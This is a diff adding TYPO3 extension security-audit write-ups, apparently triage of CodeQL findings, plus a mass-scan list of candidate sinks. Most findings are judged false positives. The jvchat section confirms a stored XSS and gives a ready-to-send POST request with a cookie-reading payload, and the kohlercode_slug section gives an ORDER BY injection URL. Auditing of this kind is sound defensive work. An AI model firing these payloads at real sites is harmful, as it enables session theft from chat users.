@@ -3777,6 +3777,72 @@ No published CVE was found that is un-patched in 13.3.3 based on source review; 
 the v13 line. Recommend confirming against the in2code/femanager GitHub security advisories and TYPO3 SA feed
 for any post-13.3.3 disclosures.
 
+### in2code_lux
+
+#### in2code_lux — SQL injection audit (Target B)
+
+**Verdict: FALSE POSITIVE (no unescaped request value reaches the raw SQL).**
+
+The sink builds SQL by string concatenation (which is why CodeQL flags it), but
+every interpolated component is either an integer produced by
+`DateTime::format('U')`, a value passed through `Connection::quote()`, or an
+allowlist-cleaned domain string. No request-derived string reaches the raw query
+unescaped. (Secondary point: the only caller is a backend dashboard widget.)
+
+## Version / compat
+- Version: **43.1.0** (`ext_emconf.php`)
+
+## Sink — `Classes/Domain/Repository/PagevisitRepository.php:341`
+`getAmountOfReferrers(FilterDto $filter, int $limit = 100)`:
+```php
+$sql = 'select referrer, count(referrer) count from ' . Pagevisit::TABLE_NAME
+    . ' where referrer != \'\''
+    . ' and referrer not regexp "' . $siteService->getAllDomainsForWhereClause() . '"'
+    . $this->extendWhereClauseWithFilterTime($filter)
+    . $this->extendWhereClauseWithFilterSite($filter)
+    . ' group by referrer having (count > 1) order by count desc limit ' . $limit;
+$records = $connection->executeQuery($sql)->fetchAllAssociative();   // line 341
+```
+
+## Component-by-component taint analysis
+- `Pagevisit::TABLE_NAME` — class constant. Not tainted.
+- `$limit` — typed `int` parameter. The caller
+  (`ReferrerAmountDataProvider::prepareData`) passes no value (default 100). Not tainted.
+- `getAllDomainsForWhereClause()` — `Classes/Domain/Service/SiteService.php:102`.
+  Domains come from site configuration; the appended current domain is
+  `StringUtility::cleanString(FrontendUtility::getCurrentDomain(), true, './_-')`,
+  an allowlist of alphanumerics + `./_-`. Quotes, spaces and `"` are stripped, so
+  it cannot break out of the `regexp "…"` literal.
+- `extendWhereClauseWithFilterTime($filter)` — `AbstractRepository.php:146-162`.
+  Emits `crdate>' . $filter->getStartTimeForFilter()->format('U') . ' and crdate<' . ...->format('U')`.
+  `getStartTimeForFilter()`/`getEndTimeForFilter()` (`FilterDto.php:661,682`)
+  return `DateTime`; `->format('U')` yields a **pure integer** string. Not injectable.
+- `extendWhereClauseWithFilterSite($filter)` — `AbstractRepository.php:194-201`.
+  Emits `site in (' . $this->quotedList($filter->getSitesForFilter()) . ')`.
+  `quotedList()` (`AbstractRepository.php:393-396`) maps every element through
+  `quoteValue()` → `Connection::quote()` (`AbstractRepository.php:388-391`).
+  **Escaped.**
+
+Even where the `FilterDto` originates from a backend request, none of the filter
+fields that reach *this* sink survive as raw strings: time → integer, site →
+`Connection::quote()`.
+
+## Reachability / auth
+Only caller: `Classes/Domain/DataProvider/ReferrerAmountDataProvider.php:37`
+(`getAmountOfReferrers($this->filter)`), a lux analytics **backend dashboard**
+data provider (BE-authenticated). The tracking/beacon FE write path stores the
+`referrer` column; this method only *reads/aggregates* it, and the stored value
+is never concatenated into the WHERE clause here.
+
+## Trigger
+None. No HTTP request lets an anonymous (or authenticated) user inject SQL at
+this sink — the tainted-looking inputs are integer-formatted or `quote()`-escaped
+before concatenation.
+
+## Bottom line
+Raw-concatenation pattern, but defended by `DateTime::format('U')` (integers) and
+`Connection::quote()` / cleanString allowlist. **Not exploitable — false positive.**
+
 ### in2code_powermail
 
 #### Security Audit — in2code/powermail
@@ -4098,6 +4164,74 @@ Rendered data is editor-curated bibliography records; anonymous create/edit is b
 
 *(Identical source to `subugoe_bib`; see `subugoe_bib.md` for the same analysis.)*
 
+### jambagecom_taxajax
+
+#### Security Audit — `jambagecom/taxajax` (TYPO3 adapted xajax 0.2.4)
+
+- **Extension**: taxajax — legacy `xajax` AJAX library adapted for TYPO3.
+- **Version**: 1.4.0 (`ext_emconf.php`); constraints TYPO3 12.4.0–13.4.99, PHP 8.2–8.4, depends `div2007 2.x`.
+- **Entry point**: PSR-15 frontend middleware `jambagecom/taxajax/preprocessing` (`Classes/Middleware/XajaxHandler.php`), triggered by request param `taxajax`. Runs `after prepare-tsfe-rendering`, `before content-length-headers` → **pre-auth** reachable in the frontend.
+- **Key architectural fact**: this extension ships the xajax *library*. It registers **no** `taxajax_include` handler itself, and never calls `processRequests()`, `getJavascript()` or `printJavascript()`. Those are invoked only by *consumer* extensions. The middleware returns `404` (`XajaxHandler.php:103`) unless a consumer has registered `$GLOBALS['TYPO3_CONF_VARS']['FE']['taxajax_include'][<key>]`.
+- **Client behaviour** (`Resources/Public/JavaScript/xajax.js`): the xajax response is an XML command envelope the client parses and executes — `cmd=="js"` → `eval(data)` (line 155); `cmd=="as"` → assign incl. `innerHTML`. So values that reach the envelope and are processed by the client ARE script-execution capable — **but only when the same-origin xajax client itself fetches and processes the response.**
+
+---
+
+## Issue 1 — CodeQL Reflected XSS `Classes/Middleware/XajaxHandler.php:117`
+
+**Verdict: FALSE POSITIVE**
+
+```php
+// :61-62  $taxajax = getParsedBody()['taxajax'] ?? getQueryParams()['taxajax'];
+// :102    if (!isset($GLOBALS[...]['taxajax_include'][$taxajax])) return 404;   // must be a REGISTERED key
+// :116    trigger_error('taxajax "' . $taxajax . '" is registered with a script to the file "'...', E_USER_ERROR);
+```
+- `$taxajax` is reflected, but to reach line 116 it must first pass line 102 — i.e. be an **already-registered** `taxajax_include` key (attacker cannot supply arbitrary values), and that key's config must be a legacy file-path string (non `class::method`).
+- `trigger_error` writes to the PHP error channel (log / `display_errors`), **not** to the HTTP response body. It only surfaces in output when `display_errors` is on (dev), and even then via PHP's error formatter, not an application-controlled markup sink.
+- **Kill reason**: input constrained to registered keys + not an HTTP-response markup sink.
+
+## Issue 2 — CodeQL Reflected XSS `class.tx_taxajax.php:672` (`print $sResponse`)
+
+**Verdict: FALSE POSITIVE (as pre-auth reflected XSS) — real underlying CDATA-breakout weakness documented**
+
+### What is reflected
+`processRequests()` reads the function name straight from the request and reflects it into an alert command on the "unknown function" path:
+```php
+// :526/:537  $sFunctionName = $_POST['xajax'];  /  $_GET['xajax'];
+// :574       $objResponse->addAlert('Unknown Function ' . $sFunctionName);
+// :646-650   header('Content-type: text/xml; charset=...');
+// :672       print $sResponse;
+```
+And `_cmdXML` (`class.tx_taxajax_response.php:521-547`) wraps the message in `<![CDATA[ ... ]]>` **without escaping `]]>`** (and `bOutputEntities` defaults to `false`), so `$sFunctionName` containing `]]>` can break out of the CDATA and inject an arbitrary `<cmd n="js"><![CDATA[...]]></cmd>` command → client `eval` (real defect).
+
+### Why it is not a confirmable pre-auth reflected XSS here
+- **Content-Type is `text/xml`.** Delivering the endpoint as a crafted link makes the browser render an XML document; CDATA/`js` commands are **not** executed on navigation. Script only runs if the origin's own `xajax.js` issues the request (same-origin XHR) and feeds the response to its command processor — a crafted link cannot force that with attacker-chosen `xajax`/`xajaxargs`.
+- **Reachability**: `processRequests()` is not called anywhere in this extension; it requires a consumer-registered `taxajax_include` handler (otherwise `XajaxHandler.php:103` returns 404 before any of this runs).
+- **Kill reason**: `text/xml` non-executing on navigation + DOM path requires same-origin client + entry point not self-wired in this extension. The `]]>`/unescaped-reflection defect is real and should be fixed (escape `]]>` and `htmlspecialchars` attribute values in `_cmdXML`), but it is not a standalone request→executing-sink chain in the shipped extension.
+
+## Issue 3 — CodeQL Reflected XSS `class.tx_taxajax.php:710` (`print getJavascript()`)
+
+**Verdict: FALSE POSITIVE (unreachable in this extension) — most dangerous latent issue if a consumer uses it**
+
+```php
+// :708-710  printJavascript() { print $this->getJavascript(...); }
+// :746      $html .= 'var xajaxRequestUri="' . $this->sRequestURI . '";'   // inside inline <script> in an HTML page
+// :148-150  $this->sRequestURI defaults to normalizedParams->getRequestUri()  (raw request URI, attacker query string)
+```
+- This *would* be an HTML-context reflected XSS: `sRequestURI` (the raw request URI) is concatenated unescaped into a `var xajaxRequestUri="..."` inline script that a consumer renders into a `text/html` page. A URL like `...?"></script><script>...` would break out.
+- **But**: `getJavascript()`/`printJavascript()` are never called within this extension (it is library API). There is no pre-auth route in taxajax itself that emits this. Exploitability depends entirely on a consumer extension calling `printJavascript()` during page rendering (and on `normalizedParams::getRequestUri()` returning the raw URI unescaped).
+- **Kill reason (for this extension)**: no caller / no self-contained request→sink chain. Flagged here as the highest-risk latent defect for downstream consumers; fix by `htmlspecialchars($this->sRequestURI, ENT_QUOTES)` before embedding.
+
+---
+
+### Summary
+| Sink | Verdict |
+|---|---|
+| `XajaxHandler.php:117` reflected XSS | FALSE POSITIVE (registered-key only; `trigger_error` → log, not response) |
+| `class.tx_taxajax.php:672` reflected XSS (`print $sResponse`) | FALSE POSITIVE as reflected (text/xml, not executed on navigation; DOM path needs same-origin client; entry not self-wired). Real latent `]]>` CDATA-breakout + unescaped `$_GET['xajax']` reflection. |
+| `class.tx_taxajax.php:710` reflected XSS (`print getJavascript()`) | FALSE POSITIVE (library API, no caller in this extension). Latent HTML-context reflected XSS via unescaped `sRequestURI` if a consumer calls `printJavascript()`. |
+
+**No CONFIRMED pre-auth reflected XSS in taxajax as shipped.** The genuine code defects (unescaped `]]>` in `_cmdXML`; unescaped `sRequestURI` in `getJavascriptConfig`; unescaped `$sFunctionName` in alert paths) are library weaknesses that materialize only through consumer wiring and same-origin client processing.
+
 ### jambagecom_tt-products
 
 #### Target B — jambagecom_tt-products — 4 unserialize sinks
@@ -4148,6 +4282,103 @@ The withdrawal and tracking flows are reachable by anonymous frontend visitors (
 
 - tt-products **2.16.11** (state: stable), `ext_emconf.php`.
 - TYPO3 constraint: `typo3 => 12.4.0-12.4.99` (also depends on `typo3db_legacy`, `div2007`, `table`).
+
+### jvelletti_jvchat
+
+#### Security Audit — `jvelletti/jvchat` (AJAX Chat)
+
+- **Extension**: jvchat — "AJAX Chat"
+- **Version**: 13.4.1 (`ext_emconf.php`); TYPO3 v13-era code (Extbase/Fluid StandaloneView, PSR-15 middleware). No explicit `depends` constraint declared.
+- **Pre-auth entry point**: PSR-15 frontend middleware `jv/jvchat/ajax` (`Configuration/RequestMiddlewares.php` → `Classes/Middleware/Ajax.php`), triggered by `?eIDMW=tx_jvchat_pi1`. Runs in the frontend stack (`after: content-length-headers`), reachable **without login**. The legacy eID script `Classes/Eid/JvchatEid.php` is **NOT registered** anywhere (`grep` for `eID_include` / `FE][eID` = empty) → dead/unreachable.
+- Note on all sinks: `Chat::perform()` never really "returns" to the middleware — `getMessages`/`returnMessage`/`showArrayAsJson` `echo` + `exit`/`die` directly, and set their own `Content-Type` via `header()`, overriding the middleware's `text/plain` Response.
+
+---
+
+## Issue 1 — CodeQL Reflected XSS `Classes/Eid/Chat.php:689` (`showArrayAsJson` JSONP echo)
+
+**Verdict: FALSE POSITIVE**
+
+```php
+// Chat.php:682  header('Content-Type: application/json; charset=utf-8');
+// Chat.php:685  $callbackId = ...getParsedBody()["callback"] ?? ...getQueryParams()["callback"];
+// Chat.php:689  echo $callbackId . "(" . $jsonOutput . ")";
+```
+- `callback` request param is reflected unescaped, but the response is `Content-Type: application/json`. A browser navigating to it does not render HTML/JS. This is a JSONP wrapper; loading it via `<script src>` executes in the *attacker's* own page context, not the victim origin → no cross-site script execution against jvchat users.
+- Additionally only reachable through `postImage()` (`a=pi`), which requires a multipart file upload and a room/user context.
+- **Kill reason**: `application/json` content type; JSONP callback is not reflected into an HTML/JS markup context that executes on the victim.
+
+## Issue 2 — CodeQL Reflected XSS `Classes/Eid/Chat.php:980` (`returnMessage` XML echo)
+
+**Verdict: FALSE POSITIVE (as *reflected* XSS) — but this is the echo used by the CONFIRMED stored XSS below**
+
+```php
+// Chat.php:967  $out .= '<msg><![CDATA['.$message.']]></msg>';
+// Chat.php:978  header('Content-Type: application/xml; charset=utf-8');
+// Chat.php:980  echo $returnMsg; exit;
+```
+- Response is `Content-Type: application/xml`, and message payloads are wrapped in `<![CDATA[...]]>`. On direct navigation the browser parses it as an XML document; CDATA text is **not** executed. So a crafted *link* does not fire script → not a classic reflected XSS.
+- The values only become executable when the chat's own same-origin JavaScript client fetches this endpoint and injects the CDATA into the DOM (`tx_jvchat.min.js` → `createNewMessageNode`: `idsearch.innerHTML=message`). That is the **stored/DOM** path (Issue 3), not a reflected-by-link vector.
+- **Kill reason (for reflected)**: `application/xml` + CDATA, not rendered as HTML on navigation.
+
+## Issue 3 — STORED XSS via chat message (`m`) → `formatMessage` BBCode `[img]` → raw Fluid → client `innerHTML`
+
+**Verdict: CONFIRMED STORED XSS (authenticated frontend user)**
+
+### Tainted chain
+1. `Classes/Eid/Chat.php:124-128` — message input taken from request and only `<`/`>` are entity-encoded; **`"` `'` `[` `]` are NOT filtered**:
+   ```php
+   $this->env['msg'] = $body['m'] ?? $query['m'] ?? null;      // :124
+   $this->env['msg'] = rawurldecode($this->env['msg']);         // :126
+   $this->env['msg'] = str_replace('<','&lt;', ...);            // :127
+   $this->env['msg'] = str_replace('>','&gt;', ...);            // :128
+   ```
+2. `Chat.php:514-515` (`a=sm`) → `putMessage($this->env['msg'], ...)` → `Chat.php:1038` → `DbRepository::putMessage` (`DbRepository.php:611-633`) stores the raw string in `tx_jvchat_entry.entry` (parameterized insert — safe from SQLi, but stores the payload verbatim).
+3. On any user's poll (`a=gm`) → `getMessages` (`Chat.php:760,829`):
+   ```php
+   $entryText = LibUtility::formatMessage($entry->entry, ...);  // :829
+   ```
+4. `Classes/Utility/LibUtility.php:271` regenerates a **raw `<img>` tag** from BBCode, inserting the attacker substrings into `src="..."` and an `onclick="...('...')"` JS string with **no quote-escaping**:
+   ```php
+   $text = preg_replace('/\[img=(.*?)\](.*?)\[\/img\]/i',
+     '<img title="click me" ... src="\2" onclick="tx_jvchat_pi1_js_chat_instance.showChatImg(\'\1\');" />', $text);
+   ```
+   Because `"` was never filtered, `\2` (or `\1`) breaks out of the attribute and injects new event-handler attributes.
+5. Fluid template `Resources/Private/Templates/*/Pi1/GetMessages.html` emits it **unescaped**: the whole section is inside `<f:format.raw>` and entryText is `<span class="tx-jvchat-entry-text"><f:format.raw>{entryText}</f:format.raw></span>`.
+6. `returnMessage` wraps it in `<msg><![CDATA[...]]></msg>` and echoes (`Chat.php:967/980`).
+7. Client sink `Resources/Public/Js/tx_jvchat.min.js` → `parseMessages` → `createNewMessageNode`: **`idsearch.innerHTML=message`** — injects the raw `<img ... onerror=...>` into the page of **every user in the room**. `<img onerror>` fires without user interaction under `innerHTML`.
+
+### Exact request to trigger (store the payload)
+```
+POST /index.php?eIDMW=tx_jvchat_pi1 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Cookie: fe_typo_user=<valid frontend session>
+
+r=<ROOM_ID>&p=<PID>&a=sm&t=0&l=en&charset=utf-8&m=%5Bimg%3Dx%5Da%22%20onerror%3D%22alert(document.cookie)%22%20x%3D%22%5B%2Fimg%5D
+```
+(`m` = `[img=x]a" onerror="alert(document.cookie)" x="[/img]`). Every other room member's chat client then executes `alert(document.cookie)` when it renders the message. An interaction-free alternative also works via the `onclick` JS-string break-out: `[img=');alert(document.cookie)//]a[/img]`.
+
+### Auth level
+Posting requires a **logged-in frontend user**: `putMessage` → `LibUtility::checkAccessToRoom($room,$user)` returns `false` when `$user` is null (`LibUtility.php:44`). So this is an **authenticated** stored XSS — exploitable by any frontend user who can post to a room (self-registration is common for chat), and it lands on all other users including moderators/superusers. The *endpoint* itself is pre-auth reachable, but message persistence is gated on FE login.
+
+---
+
+## Issue 4 — SQL injection in eID DB queries
+
+**Verdict: FALSE POSITIVE**
+
+- All request-derived numeric inputs are `intval()`-cast in `Chat::init` (`room_id`, `uid`, `lastid`, `pid`, `uc` — lines 116,120,131-133) before reaching the DB layer.
+- `Classes/Domain/Repository/DbRepository.php` uses Doctrine `QueryBuilder` with `createNamedParameter(..., Connection::PARAM_INT/PARAM_STR)` throughout; the message body is stored via `->insert()->values($data)` (parameterized). `getFeUserByName` uses `strip_tags` + `PARAM_STR` named parameter. No request value is concatenated into raw SQL. (`setUserlistSnippet`/`setTooltipSnippet` set non-request-derived data.)
+
+---
+
+### Summary
+| Sink | Verdict |
+|---|---|
+| `Chat.php:689` reflected XSS (JSONP) | FALSE POSITIVE (application/json) |
+| `Chat.php:980` reflected XSS (XML echo) | FALSE POSITIVE as reflected (application/xml + CDATA); it is the echo of the confirmed stored XSS |
+| `JvchatEid.php:41` / `:48` reflected XSS | FALSE POSITIVE (script not registered as eID → unreachable; timer output not tainted) |
+| **Chat message `m` → `formatMessage [img]` → raw Fluid → client `innerHTML`** | **CONFIRMED STORED XSS (authenticated FE user)** |
+| eID DB SQLi | FALSE POSITIVE (int-cast + parameterized QueryBuilder) |
 
 ### jweiland_events2
 
@@ -4227,6 +4458,159 @@ The withdrawal and tracking flows are reachable by anonymous frontend visitors (
 - No public CVE / TYPO3-EXT-SA advisory is known to affect **events2 10.2.10** (current release for TYPO3 v13.4, 2025).
 - The code shows the defensive patterns that historically hardened this extension: the frontend event-management flow is fully gated behind `RestrictAccessEventListener`, newly created events are force-hidden pending editor activation, and all AJAX/search DB access is parameterized. No regression of those mitigations was found.
 - Recommendation: track the `jweiland-net/events2` GitHub security advisories feed; nothing in this version requires remediation for the pre-auth threat model.
+
+### jweiland_kk-downloader
+
+#### jweiland_kk-downloader — SQL injection audit (Target C)
+
+**Verdict: CONFIG/DB-SOURCED (FlexForm, editor-controlled allowlist). NOT pre-auth.**
+
+The ORDER BY injection is real at the code level, but the tainted values come
+from the plugin's FlexForm configuration (`pi_flexform`, set by a backend editor
+and stored in the DB) — not from any frontend request parameter. Both fields are
+fixed `selectSingle` allowlists. An anonymous frontend visitor cannot influence
+them.
+
+## Version / compat
+- Version: **7.0.0**
+- TYPO3: **10.4.37 – 11.5.99** (`ext_emconf.php`)
+
+## Sink — `Classes/Domain/Repository/DownloadRepository.php:67,71,72`
+`getDownloads(array $storagePages, int $categoryUid, string $orderBy, string $direction, int $limit, int $offset)`:
+```php
+if ($orderBy === '') {
+    $queryBuilder->orderBy('i.name', 'ASC');
+} else {
+    $queryBuilder->orderBy('i.' . $orderBy, $direction);   // line 67
+}
+$statement = $queryBuilder
+    ->setMaxResults($limit)     // line 71 — typed int, safe
+    ->setFirstResult($offset)   // line 72 — typed int, safe
+    ->execute();
+```
+Only **line 67** is a candidate: `'i.' . $orderBy` (identifier) and `$direction`
+(ORDER direction, appended raw) concatenated into `orderBy()`. Lines 71-72 take
+typed `int` (`$limit`, `$offset`) — not injectable.
+
+## Tainted chain (source is FlexForm config, not request)
+- `Classes/Plugin/KkDownloader.php:179-186` calls
+  `getDownloads($storagePages, $this->settings['categoryUid'], $this->settings['orderBy'], $this->settings['orderDirection'], …)`
+- `$this->settings` is populated by `getFlexFormSettings()`:
+  - `Classes/Plugin/KkDownloader.php:283` `$settings['orderBy'] = $this->getFlexFormValue('orderby');`
+  - `Classes/Plugin/KkDownloader.php:284-285` `$settings['orderDirection'] = $this->getFlexFormValue('ascdesc') ?: 'ASC';`
+- `getFlexFormValue()` (`KkDownloader.php:312-314`) =
+  `pi_getFFvalue($this->cObj->data['pi_flexform'], $field, $sheet)` — reads the
+  content element's **`pi_flexform`** column (backend-editor configuration stored
+  in the DB), **not** `$_GET`/`$_POST`/piVars.
+
+There is no path from a frontend request parameter (piVars, query args) to
+`$orderBy`/`$direction`. (The only request-derived value near this call is
+`$this->piVars['pointer']`, which is `(int)`-cast into `$offset` at line 185 —
+safe.)
+
+## FlexForm fields are fixed allowlists — `Configuration/FlexForms/KkDownloader.xml`
+- `<orderby>`: `type=select` / `selectSingle`, values limited to
+  `name`, `image`, `crdate`, `tstamp`, `cat`, `last_downloaded`, `sorting`.
+- `<ascdesc>`: `type=select` / `selectSingle`, values limited to `ASC`, `DESC`.
+
+So even the backend editor is constrained to a safe allowlist through the TCEforms
+UI.
+
+## Reachability / auth
+The plugin (`Classes/Plugin/KkDownloader.php`) is an anonymous frontend
+pi_base plugin (`FrontendRestrictionContainer`), but the injectable arguments are
+sourced from the content element's FlexForm, which requires **backend editor
+access** to set and is delivered from the DB, not the HTTP request.
+
+## Trigger
+None from the frontend. An anonymous visitor has no request parameter that
+reaches `orderBy`. Reaching the raw ORDER BY would require backend write access
+to the `pi_flexform` value *and* bypassing the FlexForm select allowlist — i.e.
+an authenticated, privileged backend action, not a pre-auth frontend SQLi.
+
+## Bottom line
+Real ORDER BY concatenation, but **config/DB-sourced via FlexForm** and
+allowlist-constrained. **Not a pre-auth SQL injection.**
+
+### kohlercode_slug
+
+#### kohlercode_slug — SQL injection audit (Target A)
+
+**Verdict: BACKEND-ONLY (authenticated BE user). NOT pre-auth.**
+
+Real ORDER BY / identifier injection exists, but every entry point is a TYPO3
+backend AJAX route gated by backend user authentication. The extension name
+"slug" is misleading: despite the task hypothesis, this is **not** a frontend
+slug-resolution middleware. `ext_emconf.php` declares `'category' => 'module'`
+and the description reads *"TYPO3 backend module for efficient management of URL
+slugs"*. There is no frontend middleware, eID, or route enhancer in the
+extension — only `Configuration/Backend/AjaxRoutes.php` and
+`Configuration/Backend/Modules.php`.
+
+## Version / compat
+- Version: **5.1.0** (state: alpha)
+- TYPO3: **14.1.0 – 14.1.99** (`ext_emconf.php`)
+
+## Sinks
+
+### PageRepository::getPageDataForList — `Classes/Domain/Repository/PageRepository.php:135-136`
+```php
+->setMaxResults($maxitems)
+->orderBy($orderby ?: 'p.crdate', $order ?: 'DESC');
+```
+`$orderby` and `$order` are concatenated into `orderBy()`. The ORDER direction
+argument (`$order`) is appended raw by the underlying Doctrine query builder and
+is not parameterizable — a genuine ORDER BY injection. (`$maxitems` reaches
+`setMaxResults`, int-coerced; the `$searchkey`/`$status` branches all use
+`createNamedParameter`, so those are clean.)
+
+### RecordRepository::getRecordDataForList — `Classes/Domain/Repository/RecordRepository.php:87-89`
+```php
+->setMaxResults($maxitems)
+->orderBy($orderby ?: 'crdate', $order ?: 'DESC');
+```
+Same ORDER BY injection via `$orderby`/`$order`. **Additionally**, this method
+concatenates `$tableName`, `$slugField`, and `$titleField` directly into
+`select()`/`from()`/`leftJoin()` (lines 51-71) with no quoting — raw table- and
+column-identifier injection on top of the ORDER BY issue.
+
+## Tainted chain (request → raw SQL)
+Both flow from `$request->getQueryParams()` in the AJAX controller:
+
+- `Classes/Controller/AjaxController.php:57-65` `listAction()`
+  `$params = $request->getQueryParams();`
+  → `getPageDataForList($params['maxentries'], $params['key'], $params['orderby'], $params['order'], $params['status'])`
+  → `PageRepository.php:136` `orderBy($orderby, $order)`
+- `Classes/Controller/AjaxController.php:79-90` `recordAction()`
+  `$params = $request->getQueryParams();`
+  → `getRecordDataForList($params['table'], $params['slug'], $params['title'], $params['maxentries'], $params['key'], $params['orderby'], $params['order'], $params['status'])`
+  → `RecordRepository.php:51-89` (`from($params['table'])`, `select('p.'.$slugField...)`, `orderBy($orderby, $order)`)
+
+The values are request-controlled, but the route is backend-scoped.
+
+## Reachability / auth
+Routes are registered in `Configuration/Backend/AjaxRoutes.php`
+(`slug_list` → `/slug/list` → `AjaxController::listAction`; `slug_record` →
+`/slug/record` → `AjaxController::recordAction`). Backend AJAX routes are
+dispatched under `/typo3/ajax/…` through TYPO3's backend request handler and
+require a **valid backend user session** (BackendUserAuthenticator); none of
+these routes declare `'access' => 'public'`. They are additionally CSRF-token
+protected. **A logged-in backend user is required — this is not reachable
+pre-auth.**
+
+## Trigger (requires authenticated BE session + CSRF token)
+```
+GET /typo3/ajax/slug/record?token=<be-csrf-token>
+    &table=pages&slug=slug&title=title&maxentries=10&key=&status=all
+    &orderby=uid&order=ASC,(SELECT ... )
+```
+(equivalently `.../slug/list?...&order=<injection>`). Not exploitable by an
+anonymous visitor.
+
+## Bottom line
+Genuine SQL injection (ORDER BY direction/field, plus table/column identifier
+injection in `RecordRepository`), **authenticated backend only**. Not a
+pre-auth / frontend-reachable SQLi.
 
 ### lochmueller_fl_realurl_image
 
@@ -4944,9 +5328,10 @@ is compared against the affected range of publicly known TYPO3 Security Advisori
 
 ## CodeQL mass-scan candidates (intra-extension, all 3350 exts)
 ```
-# 886 raw -> 680 after noise filter
+# 1006 raw -> 780 after noise filter
 
 [CRIT] Code injection       erecht24_er24-rechtstexte    Classes/Controller/AjaxController.php:131
+[CRIT] Code injection       pixelant_pxa-pm-importer     Classes/Controller/Ajax/ProgressBarController.php:42
 [XSS ] Reflected XSS        caretaker_caretaker_instance Classes/Controller/EidController.php:22
 [XSS ] Reflected XSS        causal_routing               Classes/Controller/EidController.php:35
 [XSS ] Reflected XSS        dl_yag                       Classes/Controller/AjaxController.php:503
@@ -4956,6 +5341,10 @@ is compared against the affected range of publicly known TYPO3 Security Advisori
 [CRIT] SQL injection        kitodo_presentation          Classes/Middleware/SearchInDocument.php:152
 [CRIT] SQL injection        kitodo_presentation          Classes/Middleware/SearchSuggest.php:64
 [CRIT] SQL injection        maispace_mai-faq             Classes/Middleware/FaqApiMiddleware.php:140
+[CRIT] SQL injection        pagemachine_ats              Classes/Domain/Repository/AjaxApplicationRepository.php:88
+[CRIT] SQL injection        pagemachine_ats              Classes/Domain/Repository/AjaxApplicationRepository.php:91
+[CRIT] SQL injection        pagemachine_ats              Classes/Domain/Repository/AjaxApplicationRepository.php:94
+[CRIT] SQL injection        pagemachine_ats              Classes/Domain/Repository/AjaxApplicationRepository.php:95
 [CRIT] Code injection       blueways_bw-bookingmanager   Classes/Controller/Backend/EntryListModuleController.php:30
 [CRIT] Command injection    friendsoftypo3_rtehtmlarea   Classes/Controller/SpellCheckingController.php:299
 [CRIT] Command injection    friendsoftypo3_rtehtmlarea   Classes/Controller/SpellCheckingController.php:393
@@ -4978,12 +5367,7 @@ is compared against the affected range of publicly known TYPO3 Security Advisori
 [CRIT] Server-side request  mittwald_typo3_forum         Classes/Controller/AbstractController.php:207
 [CRIT] Server-side request  mittwald_typo3_forum         Classes/Controller/AbstractController.php:211
 [CRIT] SQL injection        netresearch_nr-vault         Classes/Controller/AuditController.php:95
-[XSS ] Reflected XSS        ehaerer_eh-bootstrap         Classes/Eid/ExtbaseDispatcher.php:155
-[XSS ] Reflected XSS        bytebuilders_t3clickmark     Classes/Middleware/InjectWidgetMiddleware.php:85
-[XSS ] Reflected XSS        jambagecom_taxajax           Classes/Middleware/XajaxHandler.php:117
-[XSS ] Reflected XSS        jambagecom_transactor        Classes/Middleware/TransactionMessageHandler.php:100
-[XSS ] Reflected XSS        jvelletti_jvchat             Classes/Eid/Chat.php:689
-[XSS ] Reflected XSS        jvelletti_jvchat             Classes/Eid/Chat.php:980
-[XSS ] Reflected XSS        jvelletti_jvchat             Classes/Eid/JvchatEid.php:41
-[XSS ] Reflected XSS        jvelletti_jvchat             Classes/Eid/JvchatEid.php:48
+[CRIT] Code injection       oktopuce_site-generator      Classes/Controller/SiteGeneratorController.php:181
+[CRIT] Unsafe deserializati oktopuce_site-generator      Classes/Controller/SiteGeneratorController.php:154
+[CRIT] Code injection       oliverklee_seminars          Classes/FrontEnd/DefaultController.php:385
 ```
